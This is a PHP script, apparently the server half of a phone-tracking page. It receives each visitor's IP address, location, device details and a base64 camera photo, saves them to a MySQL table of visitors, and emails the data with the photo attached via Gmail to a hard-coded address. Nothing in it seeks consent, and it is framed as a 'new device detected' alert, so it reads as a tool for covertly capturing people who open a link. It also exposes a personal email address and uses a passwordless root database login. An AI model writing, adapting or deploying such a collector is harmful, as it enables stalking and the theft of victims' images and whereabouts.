<?php
require 'vendor/autoload.php'; // jika pakai Composer

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Data koneksi ke database
$host = "localhost";
$user = "root";
$pass = "";
$db   = "lacak_hp";

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) {
    die("Koneksi gagal: " . $conn->connect_error);
}

// Ambil data dari request
$data = json_decode(file_get_contents("php://input"), true);
$ip      = $data['ip'] ?? '';
$lokasi  = $data['lokasi'] ?? '';
$device  = $data['device'] ?? '';
$foto    = $data['foto'] ?? ''; // base64 image

// Simpan ke database
$stmt = $conn->prepare("INSERT INTO pengunjung (ip_address, lokasi, perangkat, foto) VALUES (?, ?, ?, ?)");
$stmt->bind_param("ssss", $ip, $lokasi, $device, $foto);
$stmt->execute();
$stmt->close();
$conn->close();

// Siapkan data email
$to_email = 'izanamiofnazi@gmail.com'; // Ganti dengan email tujuan
$from_email = 'izanamiofnazi@gmail.com'; // Gmail kamu
$from_name = 'Notifikasi Web';
$subject = 'Deteksi Perangkat Baru';

$mail = new PHPMailer(true);

try {
    // Konfigurasi SMTP Gmail
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = $from_email; // Gmail kamu
    $mail->Password = 'APLIKASI_PASSWORD'; // App password Gmail
    $mail->SMTPSecure = 'tls';
    $mail->Port = 587;

    // Set pengirim dan penerima
    $mail->setFrom($from_email, $from_name);
    $mail->addAddress($to_email);

    // Decode gambar base64
    $cleanedData = str_replace('data:image/png;base64,', '', $foto);
    $decodedImage = base64_decode($cleanedData);
    $filename = 'foto_' . time() . '.png';

    // Tambahkan lampiran
    $mail->addStringAttachment($decodedImage, $filename, 'base64', 'image/png');

    // Isi email
    $body = "IP Address: $ip\nLokasi: $lokasi\nPerangkat: $device";
    $mail->Subject = $subject;
    $mail->Body    = $body;

    $mail->send();
    echo "Email berhasil dikirim.";
} catch (Exception $e) {
    echo "Gagal mengirim email. Error: {$mail->ErrorInfo}";
}
?>
